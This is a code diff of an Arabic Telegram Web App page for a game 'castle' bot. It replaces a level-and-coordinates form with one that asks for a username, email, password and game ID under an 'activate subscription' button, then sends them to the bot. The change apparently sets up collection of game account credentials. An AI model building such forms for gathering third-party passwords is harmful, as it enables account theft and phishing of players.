@@ -2,33 +2,34 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background-color: #1a1a1a; color: white; text-align: center; padding: 20px; }
-        .box { background: #2d2d2d; padding: 20px; border-radius: 15px; border: 2px solid #0088cc; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; font-size: 16px; }
-        button { width: 100%; padding: 15px; border-radius: 10px; border: none; background: #0088cc; color: white; font-weight: bold; font-size: 18px; cursor: pointer; }
+        body { font-family: sans-serif; background-color: #121212; color: white; padding: 20px; }
+        .form-group { margin-bottom: 15px; }
+        input { width: 100%; padding: 10px; border-radius: 5px; border: 1px solid #333; background: #1e1e1e; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 12px; background: #0088cc; border: none; color: white; border-radius: 5px; font-weight: bold; cursor: pointer; }
+        h2 { text-align: center; color: #0088cc; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h3>🏰 إعدادات القلعة</h3>
-        <input type="number" id="lvl" placeholder="المستوى">
-        <input type="text" id="loc" placeholder="الإحداثيات">
-        <button onclick="send()">حفظ وإرسال ✅</button>
-    </div>
+    <h2>🚀 ربط قلعة جديدة</h2>
+    <div class="form-group"><input type="text" id="username" placeholder="اسم المستخدم"></div>
+    <div class="form-group"><input type="email" id="email" placeholder="البريد الإلكتروني"></div>
+    <div class="form-group"><input type="password" id="pass" placeholder="كلمة السر"></div>
+    <div class="form-group"><input type="text" id="game_id" placeholder="ID اللعبة (IG)"></div>
+    <button onclick="sendData()">تفعيل الاشتراك الآن ✅</button>
 
     <script>
         let tg = window.Telegram.WebApp;
-        tg.expand();
-
-        function send() {
+        function sendData() {
             let data = {
-                lvl: document.getElementById('lvl').value,
-                loc: document.getElementById('loc').value
+                user: document.getElementById('username').value,
+                email: document.getElementById('email').value,
+                pass: document.getElementById('pass').value,
+                id: document.getElementById('game_id').value,
+                date: new Date().toLocaleDateString('ar-DZ')
             };
-            // السطر الأهم لإرسال البيانات للبوت
             tg.sendData(JSON.stringify(data));
             tg.close();
         }
